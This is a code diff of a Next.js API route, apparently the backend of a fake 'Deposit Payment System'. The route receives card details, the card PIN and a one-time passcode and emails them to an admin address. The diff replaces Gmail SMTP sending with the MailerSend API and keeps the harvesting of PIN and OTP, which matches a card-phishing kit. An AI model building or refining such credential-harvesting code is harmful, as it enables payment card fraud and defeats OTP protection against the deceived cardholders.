@@ -1,28 +1,15 @@
 import { type NextRequest, NextResponse } from "next/server"
-import nodemailer from "nodemailer"
 
 export async function POST(request: NextRequest) {
   try {
     const { subject, message, userEmail, amount, cardDetails, pin, otp } = await request.json()
 
-    // Validate environment variables
-    if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
-      return NextResponse.json({ success: false, error: "Email configuration missing" }, { status: 500 })
+    if (!process.env.MAILERSEND_API_TOKEN || !process.env.RECEIVER_EMAIL) {
+      return NextResponse.json({ success: false, error: "MailerSend configuration missing" }, { status: 500 })
     }
 
-    // Create transporter
-    const transporter = nodemailer.createTransport({
-      host: "smtp.gmail.com",
-      port: 587,
-      secure: false,
-      auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS,
-      },
-    })
-
-    // Prepare email content based on the step
     let emailContent = ""
+    const emailSubject = subject
 
     if (subject.includes("PIN")) {
       emailContent = `
@@ -50,15 +37,38 @@ export async function POST(request: NextRequest) {
       `
     }
 
-    // Send email
-    await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to: process.env.RECEIVER_EMAIL,
-      subject: subject,
+    const mailersendPayload = {
+      from: {
+        email: "noreply@yourdomain.com",
+        name: "Deposit Payment System",
+      },
+      to: [
+        {
+          email: process.env.RECEIVER_EMAIL,
+          name: "Admin",
+        },
+      ],
+      subject: emailSubject,
       html: emailContent,
+      text: emailContent.replace(/<[^>]*>/g, ""), // Strip HTML for text version
+    }
+
+    const response = await fetch("https://api.mailersend.com/v1/email", {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${process.env.MAILERSEND_API_TOKEN}`,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(mailersendPayload),
     })
 
-    return NextResponse.json({ success: true, message: "Email sent successfully" })
+    if (!response.ok) {
+      const errorData = await response.text()
+      console.error("MailerSend API error:", errorData)
+      return NextResponse.json({ success: false, error: "Failed to send email via MailerSend" }, { status: 500 })
+    }
+
+    return NextResponse.json({ success: true, message: "Email sent successfully via MailerSend" })
   } catch (error) {
     console.error("Email sending error:", error)
     return NextResponse.json({ success: false, error: "Failed to send email" }, { status: 500 })
